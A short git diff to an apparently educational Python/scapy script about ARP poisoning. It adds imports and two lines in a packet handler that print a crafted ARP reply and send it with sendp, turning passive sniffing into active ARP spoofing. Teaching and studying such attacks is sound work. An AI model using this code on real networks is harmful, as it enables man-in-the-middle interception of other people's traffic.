@@ -1,7 +1,7 @@
 import argparse
 import ipaddress
 import re
-from scapy.all import sniff, ARP, sr, Ether
+from scapy.all import sniff, ARP, sr, Ether, send, sendp
 
 def check_ipv4(ip:str) -> bool:
     try:
@@ -48,6 +48,8 @@ def handle(pkt):
             pdst=arp.psrc,
             hwdst=arp.hwsrc
         )
+        pkt.show()
+        sendp(pkt)
 
 #--------------------argparse--------------------
 parser = argparse.ArgumentParser(description="educative program about ARP poisoning")
